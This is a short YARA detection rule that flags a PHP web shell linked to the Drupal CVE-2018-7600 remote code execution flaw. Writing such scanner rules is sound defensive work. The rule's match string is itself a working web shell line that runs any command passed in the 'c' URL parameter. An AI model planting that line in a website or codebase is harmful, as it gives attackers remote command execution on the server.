rule drupal_CVE_2018_7600_RCE_0
{
	meta: 
	author= "Brian Laskowski"
	info= " Drupal RCE shell"

	strings:
		$a = "echo "<pre>";system($_GET['c']); echo "</pre>";"
	
	condition:
		$a
}

